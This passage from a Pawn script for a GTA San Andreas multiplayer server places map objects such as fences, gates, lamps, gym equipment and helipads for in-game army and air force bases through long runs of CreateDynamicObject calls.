	CreateDynamicObject(3877,1540.90002441,-1616.69995117,14.00000000,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (7)
	CreateDynamicObject(982,1561.80004883,-1620.30004883,13.30000019,0.00000000,0.00000000,90.00000000); //object(fenceshit) (1)
	CreateDynamicObject(982,1561.90002441,-1635.50000000,13.30000019,0.00000000,0.00000000,90.00000000); //object(fenceshit) (2)
	CreateDynamicObject(3877,1574.59997559,-1635.50000000,14.00000000,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (8)

	CreateObject(18452,1546.09997559,-1610.30004883,11.80000019,0.00000000,0.00000000,0.00000000); //object(cw_tscanopy01) (1)

	CreateDynamicObject(982,1582.00000000,-1715.40002441,5.90000010,0.00000000,0.00000000,90.00000000); //object(fenceshit) (3)

	//          			EJERCITO EXT.
	CreateDynamicObject(987,2753.80004883,-2342.30004883,12.69999981,0.00000000,0.00000000,270.00000000); //object(elecfence_bar) (1)
	CreateDynamicObject(987,2753.79980469,-2330.29980469,12.69999981,0.00000000,0.00000000,270.00000000); //object(elecfence_bar) (2)
	CreateDynamicObject(987,2720.10009766,-2553.30004883,12.60000038,0.00000000,0.00000000,270.00000000); //object(elecfence_bar) (3)
	CreateDynamicObject(2952,2729.00000000,-2452.19995117,16.60000038,0.00000000,0.00000000,180.00000000); //object(gen_doorint03) (1)
	CreateDynamicObject(1251,2737.19995117,-2475.00000000,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (1)
	CreateDynamicObject(3578,2733.89990234,-2470.00000000,13.39999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (1)
	CreateDynamicObject(1251,2737.29980469,-2471.39941406,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,2737.39990234,-2467.60009766,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (4)
	CreateDynamicObject(1251,2737.50000000,-2464.09960938,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (5)
	CreateDynamicObject(3578,2733.89990234,-2459.69995117,13.39999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (2)
	CreateDynamicObject(1251,2737.69995117,-2460.39990234,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (6)
	CreateDynamicObject(1251,2737.80004883,-2455.89990234,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (7)
	CreateDynamicObject(3578,2727.19995117,-2487.39990234,13.39999962,0.00000000,0.00000000,180.00000000); //object(dockbarr1_la) (3)
	CreateDynamicObject(1251,2732.10009766,-2491.10009766,12.69999981,0.00000000,0.00000000,180.00000000); //object(smashbar) (8)
	CreateDynamicObject(1251,2728.60009766,-2491.19995117,12.69999981,0.00000000,0.00000000,179.99450684); //object(smashbar) (9)
	CreateDynamicObject(1251,2725.30004883,-2491.30004883,12.69999981,0.00000000,0.00000000,179.99450684); //object(smashbar) (10)
	CreateDynamicObject(1251,2722.10009766,-2491.39990234,12.69999981,0.00000000,0.00000000,179.99450684); //object(smashbar) (11)
	CreateDynamicObject(1231,2810.60009766,-2433.00000000,15.19999981,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (1)
	CreateDynamicObject(1231,2810.60009766,-2440.69995117,15.19999981,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (2)
	CreateDynamicObject(1231,2820.89990234,-2440.69995117,13.69999981,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (3)
	CreateDynamicObject(1231,2821.10009766,-2433.00000000,13.69999981,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (4)
	CreateDynamicObject(2064,2717.30004883,-2398.30004883,13.30000019,0.00000000,0.00000000,269.99996948); //object(cj_feildgun) (1)
	CreateDynamicObject(2064,2717.19921875,-2411.89941406,13.30000019,0.00000000,0.00000000,269.98901367); //object(cj_feildgun) (2)
	CreateDynamicObject(2064,2717.19995117,-2497.30004883,13.30000019,0.00000000,0.00000000,269.99450684); //object(cj_feildgun) (3)
	CreateDynamicObject(2064,2717.00000000,-2509.89990234,13.30000019,0.00000000,0.00000000,269.99450684); //object(cj_feildgun) (4)
	CreateDynamicObject(1491,2747.69995117,-2452.00000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(gen_doorint01) (1)
	CreateDynamicObject(3396,2743.00000000,-2453.89990234,12.80000019,0.00000000,0.00000000,180.00000000); //object(a51_sdsk_4_) (1)
	CreateDynamicObject(16782,2742.39990234,-2453.80004883,14.39999962,0.00000000,0.00000000,0.00000000); //object(a51_radar_scan) (1)
	CreateDynamicObject(3267,2749.00000000,-2453.39990234,15.10000038,0.00000000,0.00000000,0.00000000); //object(mil_samsite) (1)
	CreateDynamicObject(3267,2743.39990234,-2453.60009766,15.10000038,0.00000000,0.00000000,0.00000000); //object(mil_samsite) (2)
	CreateDynamicObject(3877,2746.29980469,-2453.50000000,17.20000076,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(1223,2733.89990234,-2473.19995117,13.39999962,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (1)
	CreateDynamicObject(1223,2733.89990234,-2469.69995117,13.39999962,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (2)
	CreateDynamicObject(1223,2733.89990234,-2465.89990234,13.39999962,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (3)
	CreateDynamicObject(1223,2733.89990234,-2462.10009766,13.39999962,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (4)
	CreateDynamicObject(1223,2734.00000000,-2458.10009766,13.39999962,0.00000000,0.00000000,0.00000000); //object(lampost_coast) (5)
	CreateDynamicObject(1223,2723.89990234,-2487.50000000,13.39999962,0.00000000,0.00000000,180.00000000); //object(lampost_coast) (6)
	CreateDynamicObject(1223,2726.89941406,-2487.39941406,13.39999962,0.00000000,0.00000000,180.00000000); //object(lampost_coast) (7)
	CreateDynamicObject(1223,2730.50000000,-2487.50000000,13.39999962,0.00000000,0.00000000,179.99450684); //object(lampost_coast) (8)
	CreateDynamicObject(1238,2720.89990234,-2499.60009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(3049,2720.19995117,-2418.69995117,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (11)
	CreateDynamicObject(3049,2720.19995117,-2414.19995117,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (13)
	CreateDynamicObject(3049,2720.10009766,-2400.80004883,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (14)
	CreateDynamicObject(3049,2720.10009766,-2396.30004883,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (15)
	CreateDynamicObject(3049,2720.10009766,-2391.80004883,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (16)
	CreateDynamicObject(3049,2720.10009766,-2387.30004883,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (17)
	CreateDynamicObject(3049,2720.39990234,-2499.50000000,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (18)
	CreateDynamicObject(3049,2720.39990234,-2495.00000000,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (19)
	CreateDynamicObject(3049,2720.39990234,-2490.50000000,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (20)
	CreateDynamicObject(3049,2720.30004883,-2513.00000000,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (21)
	CreateDynamicObject(3049,2720.30004883,-2517.50000000,14.39999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate) (22)
	CreateDynamicObject(1232,2718.80004883,-2498.69995117,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp1) (1)
	CreateDynamicObject(1232,2718.80004883,-2509.50000000,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp1) (2)
	CreateDynamicObject(1232,2719.10009766,-2410.80004883,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp1) (3)
	CreateDynamicObject(1232,2719.10009766,-2399.80004883,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp1) (4)
	CreateDynamicObject(3877,2747.60009766,-2451.39990234,12.69999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,2749.69995117,-2451.39990234,12.69999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(987,2720.10009766,-2371.89990234,15.89999962,0.00000000,0.00000000,270.00000000); //object(elecfence_bar) (2)
	CreateDynamicObject(987,2720.39941406,-2514.09960938,15.89999962,0.00000000,0.00000000,270.00000000); //object(elecfence_bar) (2)
	CreateDynamicObject(2921,2720.19995117,-2400.89990234,15.30000019,358.01095581,6.00363159,64.20913696); //object(kmb_cam) (1)
	CreateDynamicObject(2921,2720.19995117,-2499.50000000,15.30000019,0.00000000,14.00000000,63.99536133); //object(kmb_cam) (2)
	CreateDynamicObject(1238,2721.60009766,-2499.60009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2722.19995117,-2499.60009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2722.89990234,-2499.60009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2723.60009766,-2499.60009766,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2724.00000000,-2508.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2723.30004883,-2508.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2722.60009766,-2508.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2721.89990234,-2508.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2721.19995117,-2508.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(5837,2729.00000000,-2511.39990234,14.39999962,0.00000000,0.00000000,0.00000000); //object(ci_guardhouse1) (1)
	CreateDynamicObject(1671,2730.50000000,-2510.80004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(swivelchair_a) (1)
	CreateDynamicObject(2836,2727.39990234,-2510.39990234,13.00000000,0.00000000,0.00000000,0.00000000); //object(gb_livingrug05) (1)
	CreateDynamicObject(14532,2726.30004883,-2510.80004883,14.00000000,0.00000000,0.00000000,268.00000000); //object(tv_stand_driv) (1)
	CreateDynamicObject(2008,2731.30004883,-2512.00000000,13.00000000,0.00000000,0.00000000,179.99993896); //object(officedesk1) (1)
	CreateDynamicObject(14532,2726.19995117,-2511.69995117,14.00000000,0.00000000,0.00000000,267.99499512); //object(tv_stand_driv) (2)
	CreateDynamicObject(3660,2711.10009766,-2488.00000000,14.30000019,0.00000000,0.00000000,0.00000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,2708.60009766,-2416.69995117,14.30000019,0.00000000,0.00000000,0.00000000); //object(lasairfbed_las) (2)
	CreateDynamicObject(3660,2709.50000000,-2384.39990234,14.30000019,0.00000000,0.00000000,0.00000000); //object(lasairfbed_las) (3)
	CreateDynamicObject(5837,2726.60009766,-2414.60009766,14.39999962,0.00000000,0.00000000,0.00000000); //object(ci_guardhouse1) (2)
	CreateDynamicObject(14532,2724.00000000,-2415.10009766,14.00000000,0.00000000,0.00000000,267.99499512); //object(tv_stand_driv) (3)
	CreateDynamicObject(14532,2724.00000000,-2414.19995117,14.00000000,0.00000000,0.00000000,267.99499512); //object(tv_stand_driv) (4)
	CreateDynamicObject(2008,2728.69995117,-2415.10009766,13.00000000,0.00000000,0.00000000,179.99450684); //object(officedesk1) (2)
	CreateDynamicObject(1671,2728.19995117,-2414.10009766,13.39999962,0.00000000,0.00000000,0.00000000); //object(swivelchair_a) (2)
	CreateDynamicObject(1238,2721.39990234,-2409.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2722.00000000,-2409.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2722.69995117,-2409.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2723.50000000,-2409.89990234,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2723.80004883,-2400.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2722.89990234,-2400.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2722.10009766,-2400.80004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(1238,2721.19995117,-2400.69995117,12.80000019,0.00000000,0.00000000,0.00000000); //object(trafficcone) (39)
	CreateDynamicObject(3406,2817.00000000,-2433.80004883,9.00000000,0.00000000,0.00000000,0.00000000); //object(cxref_woodjetty) (1)
	CreateDynamicObject(3406,2817.00000000,-2435.89990234,9.00000000,0.00000000,0.00000000,0.00000000); //object(cxref_woodjetty) (2)
	CreateDynamicObject(3406,2817.00000000,-2438.00000000,9.00000000,0.00000000,0.00000000,0.00000000); //object(cxref_woodjetty) (3)
	CreateDynamicObject(3406,2817.00000000,-2440.10009766,9.00000000,0.00000000,0.00000000,0.00000000); //object(cxref_woodjetty) (4)
	CreateDynamicObject(3406,2810.50000000,-2437.30004883,9.50000000,342.00000000,0.00000000,270.00000000); //object(cxref_woodjetty) (5)
	CreateDynamicObject(3414,2757.30004883,-2539.39990234,14.80000019,0.00000000,0.00000000,92.00000000); //object(ce_oldhut1) (1)
	CreateDynamicObject(1583,2757.39990234,-2532.80004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(tar_gun2) (1)
	CreateDynamicObject(1583,2755.10009766,-2540.80004883,13.50000000,0.00000000,0.00000000,266.00000000); //object(tar_gun2) (9)
	CreateDynamicObject(1583,2755.10009766,-2538.60009766,13.50000000,0.00000000,0.00000000,265.99548340); //object(tar_gun2) (10)
	CreateDynamicObject(1583,2755.10009766,-2536.80004883,13.50000000,0.00000000,0.00000000,265.99548340); //object(tar_gun2) (11)
	CreateDynamicObject(1583,2760.10009766,-2532.60009766,13.50000000,0.00000000,0.00000000,0.00000000); //object(tar_gun2) (12)
	CreateDynamicObject(1583,2761.60009766,-2532.69995117,13.50000000,0.00000000,0.00000000,0.00000000); //object(tar_gun2) (13)
	CreateDynamicObject(1583,2762.39990234,-2536.89990234,13.50000000,0.00000000,0.00000000,0.00000000); //object(tar_gun2) (14)
	CreateDynamicObject(1583,2759.60009766,-2537.00000000,13.50000000,0.00000000,0.00000000,0.00000000); //object(tar_gun2) (15)
	CreateDynamicObject(3934,2772.69995117,-2354.00000000,12.69999981,0.00000000,0.00000000,0.00000000); //object(helipad01) (1)
	CreateDynamicObject(3934,2788.60009766,-2337.69995117,12.69999981,0.00000000,0.00000000,0.00000000); //object(helipad01) (2)
	CreateDynamicObject(3934,2788.30004883,-2353.69995117,12.69999981,0.00000000,0.00000000,0.00000000); //object(helipad01) (3)
	CreateDynamicObject(3934,2772.89990234,-2337.69995117,12.69999981,0.00000000,0.00000000,0.00000000); //object(helipad01) (4)
	CreateDynamicObject(3877,2791.89990234,-2350.50000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (2)
	CreateDynamicObject(3877,2791.80004883,-2357.30004883,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (3)
	CreateDynamicObject(3877,2784.39990234,-2357.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (4)
	CreateDynamicObject(3877,2784.39990234,-2350.39990234,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (5)
	CreateDynamicObject(3877,2776.39990234,-2350.69995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,2776.39990234,-2357.50000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (7)
	CreateDynamicObject(3877,2768.69995117,-2357.39990234,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (8)
	CreateDynamicObject(3877,2768.69995117,-2350.69995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (9)
	CreateDynamicObject(3877,2769.00000000,-2341.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (10)
	CreateDynamicObject(3877,2769.10009766,-2334.39990234,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (11)
	CreateDynamicObject(3877,2776.60009766,-2334.39990234,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (12)
	CreateDynamicObject(3877,2776.60009766,-2341.10009766,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (13)
	CreateDynamicObject(3877,2784.69995117,-2341.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (14)
	CreateDynamicObject(3877,2784.69995117,-2334.30004883,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (15)
	CreateDynamicObject(3877,2792.39990234,-2334.39990234,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (16)
	CreateDynamicObject(3877,2792.30004883,-2341.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (17)
	CreateDynamicObject(1251,2777.80004883,-2472.60009766,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,2777.80004883,-2476.10009766,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,2778.00000000,-2442.10009766,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,2778.00000000,-2438.60009766,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,2778.00000000,-2435.10009766,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,2778.00000000,-2431.10009766,12.69999981,0.00000000,0.00000000,270.00000000); //object(smashbar) (3)

	//          				EJERCITO INT.               //
	CreateDynamicObject(3294,238.39999390,183.30000305,1004.70001221,0.00000000,0.00000000,270.00000000); //object(cxf_spraydoor1) (1)
	CreateDynamicObject(10154,228.30000305,151.39999390,1004.79998779,0.00000000,0.00000000,0.00000000); //object(pier69gdr) (1)
	CreateDynamicObject(10154,228.30000305,161.39999390,1004.79998779,0.00000000,0.00000000,0.00000000); //object(pier69gdr) (2)
	CreateDynamicObject(10154,230.80000305,169.80000305,1004.79998779,0.00000000,0.00000000,270.00000000); //object(pier69gdr) (3)
	CreateDynamicObject(10671,272.50000000,177.79980469,1008.00000000,0.00000000,0.00000000,0.00000000); //object(savehousegdoor_sfs) (1)
	CreateDynamicObject(10671,272.50000000,177.80000305,1011.50000000,0.00000000,0.00000000,0.00000000); //object(savehousegdoor_sfs) (2)
	CreateDynamicObject(10671,272.70001221,170.80000305,1011.50000000,270.00000000,270.00000000,270.00000000); //object(savehousegdoor_sfs) (3)
	CreateDynamicObject(2959,238.10000610,183.19999695,1002.00000000,0.00000000,0.00000000,270.00000000); //object(rider1_door) (1)
	CreateDynamicObject(1722,233.29980469,148.19921875,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (1)
	CreateDynamicObject(1722,233.30000305,147.39999390,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (2)
	CreateDynamicObject(1722,233.30000305,146.60000610,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (3)
	CreateDynamicObject(1722,233.30000305,145.80000305,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (4)
	CreateDynamicObject(1722,233.30000305,145.00000000,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (5)
	CreateDynamicObject(1722,233.30000305,144.19999695,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (6)
	CreateDynamicObject(1722,233.30000305,149.00000000,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (7)
	CreateDynamicObject(1722,235.30000305,149.00000000,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (8)
	CreateDynamicObject(1722,235.30000305,148.19999695,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (9)
	CreateDynamicObject(1722,235.30000305,147.39999390,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (10)
	CreateDynamicObject(1722,235.30000305,146.60000610,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (11)
	CreateDynamicObject(1722,235.30000305,145.69999695,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (12)
	CreateDynamicObject(1722,235.30000305,145.00000000,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (13)
	CreateDynamicObject(1722,235.30000305,144.19999695,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (14)
	CreateDynamicObject(1722,231.69999695,144.10000610,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (15)
	CreateDynamicObject(1722,231.69999695,144.89999390,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (16)
	CreateDynamicObject(1722,231.69999695,145.69999695,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (17)
	CreateDynamicObject(1722,231.69999695,146.50000000,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (18)
	CreateDynamicObject(1722,231.69999695,147.19999695,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (19)
	CreateDynamicObject(1722,231.69999695,148.10000610,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (20)
	CreateDynamicObject(1722,231.69999695,148.89999390,1002.00000000,0.00000000,0.00000000,90.00000000); //object(off_chairnu) (21)
	CreateDynamicObject(16782,228.50000000,145.30000305,1005.00000000,0.00000000,0.00000000,0.00000000); //object(a51_radar_scan) (1)
	CreateDynamicObject(2737,228.39999390,143.10000610,1003.70001221,0.00000000,0.00000000,90.00000000); //object(police_nb_car) (1)
	CreateDynamicObject(2611,228.39999390,149.30000305,1005.50000000,0.00000000,0.00000000,90.00000000); //object(police_nb1) (1)
	CreateDynamicObject(2611,228.39999390,147.60000610,1005.50000000,0.00000000,0.00000000,90.00000000); //object(police_nb1) (2)
	CreateDynamicObject(2612,228.39999390,142.89999390,1005.40002441,0.00000000,0.00000000,90.00000000); //object(police_nb2) (1)
	CreateDynamicObject(2614,228.39999390,145.30000305,1008.20001221,0.00000000,0.00000000,90.00000000); //object(cj_us_flag) (1)
	CreateDynamicObject(2619,249.09960938,153.29980469,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (1)
	CreateDynamicObject(2619,249.10000610,158.60000610,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (2)
	CreateDynamicObject(2915,250.10000610,182.10000610,1002.20001221,0.00000000,0.00000000,0.00000000); //object(kmb_dumbbell2) (1)
	CreateDynamicObject(2915,252.00000000,181.69999695,1002.20001221,0.00000000,0.00000000,0.00000000); //object(kmb_dumbbell2) (2)
	CreateDynamicObject(2628,247.50000000,182.19999695,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_bench2) (1)
	CreateDynamicObject(2628,246.19999695,182.19999695,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_bench2) (2)
	CreateDynamicObject(2629,244.50000000,182.19999695,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_bench1) (1)
	CreateDynamicObject(2629,242.50000000,182.19999695,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_bench1) (2)
	CreateDynamicObject(2630,254.80000305,182.30000305,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_bike) (1)
	CreateDynamicObject(2630,253.69999695,182.19999695,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_bike) (2)
	CreateDynamicObject(2630,255.89999390,182.39999390,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_bike) (3)
	CreateDynamicObject(2631,250.39999390,182.10000610,1002.00000000,0.00000000,0.00000000,0.00000000); //object(gym_mat1) (1)
	CreateDynamicObject(2913,243.00000000,182.69999695,1002.90002441,0.00000000,270.00000000,0.00000000); //object(kmb_bpress) (1)
	CreateDynamicObject(2913,244.89999390,182.69999695,1002.90002441,0.00000000,270.00000000,0.00000000); //object(kmb_bpress) (2)
	CreateDynamicObject(14781,253.39999390,174.10000610,1002.90002441,0.00000000,0.00000000,0.00000000); //object(in_bxing05) (1)
	CreateDynamicObject(14780,261.70001221,178.80000305,1002.90002441,0.00000000,0.00000000,0.00000000); //object(in_bxing04) (1)
	CreateDynamicObject(2619,249.10000610,163.80000305,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (3)
	CreateDynamicObject(2619,249.10000610,169.10000610,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (4)
	CreateDynamicObject(2619,241.00000000,153.30000305,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (1)
	CreateDynamicObject(2619,241.00000000,158.50000000,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (1)
	CreateDynamicObject(2619,241.00000000,163.80000305,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (1)
	CreateDynamicObject(2619,241.00000000,169.10000610,1003.90002441,0.00000000,0.00000000,0.00000000); //object(mp_ammoambient) (1)

	//          				FUERZA AEREA EXT.               //
	CreateDynamicObject(10771,526.59960938,-2340.89941406,0.00000000,0.00000000,0.00000000,0.00000000); //object(carrier_hull_sfse) (1)
	CreateDynamicObject(10770,529.79998779,-2348.50000000,33.20000076,0.00000000,0.00000000,0.00000000); //object(carrier_bridge_sfse) (1)
	CreateDynamicObject(9241,429.50000000,-2340.30004883,11.60000038,0.00000000,0.00000000,180.00000000); //object(copbits_sfn) (1)
	CreateDynamicObject(8948,559.90002441,-2326.89990234,7.19999981,0.00000000,0.00000000,270.00000000); //object(lckupgrgdoor_lvs) (1)
	CreateDynamicObject(8948,559.90002441,-2326.89990234,3.70000005,0.00000000,0.00000000,270.00000000); //object(lckupgrgdoor_lvs) (2)
	CreateDynamicObject(2944,518.50000000,-2327.89990234,6.30000019,0.00000000,0.00000000,270.00000000); //object(freight_sfw_door) (1)
	CreateDynamicObject(8378,417.50000000,-2336.60009766,-30.79999924,0.00000000,90.00000000,90.00000000); //object(vgsbighngrdoor) (5)
	CreateDynamicObject(8378,417.60000610,-2345.10009766,-30.79999924,0.00000000,90.00000000,89.99450684); //object(vgsbighngrdoor) (6)
	CreateDynamicObject(8948,549.40002441,-2354.89990234,6.50000000,0.00000000,0.00000000,270.00000000); //object(lckupgrgdoor_lvs) (3)
	CreateDynamicObject(8948,549.40002441,-2354.89990234,7.80000019,0.00000000,0.00000000,270.00000000); //object(lckupgrgdoor_lvs) (4)
	CreateDynamicObject(2944,537.09997559,-2343.10009766,13.30000019,0.00000000,0.00000000,270.00000000); //object(freight_sfw_door) (2)
	CreateDynamicObject(3753,474.70001221,-2320.00000000,2.50000000,0.00000000,0.00000000,0.00000000); //object(dockwall_las2) (1)
	CreateDynamicObject(8948,476.79998779,-2329.69995117,11.69999981,0.00000000,90.00000000,270.00000000); //object(lckupgrgdoor_lvs) (5)
	CreateDynamicObject(8948,469.50000000,-2329.69995117,11.69999981,0.00000000,90.00000000,270.00000000); //object(lckupgrgdoor_lvs) (6)
	CreateDynamicObject(8948,462.20001221,-2329.69995117,11.69999981,0.00000000,90.00000000,270.00000000); //object(lckupgrgdoor_lvs) (7)
	CreateDynamicObject(8948,476.89999390,-2328.00000000,10.00000000,0.00000000,0.00000000,270.00000000); //object(lckupgrgdoor_lvs) (8)
	CreateDynamicObject(8948,479.39999390,-2327.89990234,8.00000000,0.00000000,0.00000000,270.00000000); //object(lckupgrgdoor_lvs) (9)
	CreateDynamicObject(8948,480.50000000,-2330.50000000,8.00000000,0.00000000,0.00000000,0.00000000); //object(lckupgrgdoor_lvs) (10)
	CreateDynamicObject(11237,528.09997559,-2348.50000000,33.09999847,0.00000000,0.00000000,0.00000000); //object(carrier_bits_sfse) (1)
	CreateDynamicObject(3277,559.70001221,-2348.39990234,15.50000000,0.00000000,0.00000000,0.00000000); //object(mil_sambase) (1)
	CreateDynamicObject(3884,559.70001221,-2348.39990234,15.50000000,0.00000000,0.00000000,0.00000000); //object(samsite_sfxrf) (1)
	CreateDynamicObject(3277,490.29998779,-2347.50000000,12.50000000,0.00000000,0.00000000,0.00000000); //object(mil_sambase) (2)
	CreateDynamicObject(3884,490.29998779,-2347.39990234,12.50000000,0.00000000,0.00000000,0.00000000); //object(samsite_sfxrf) (2)
	CreateDynamicObject(2985,497.70001221,-2347.50000000,17.79999924,0.00000000,0.00000000,130.00000000); //object(minigun_base) (1)
	CreateDynamicObject(2985,497.79998779,-2349.39990234,17.79999924,0.00000000,0.00000000,229.99572754); //object(minigun_base) (2)
	CreateDynamicObject(3279,465.20001221,-2351.30004883,11.69999981,0.00000000,0.00000000,90.00000000); //object(a51_spottower) (1)
	CreateDynamicObject(3279,578.40002441,-2349.39990234,11.69999981,0.00000000,0.00000000,90.00000000); //object(a51_spottower) (2)
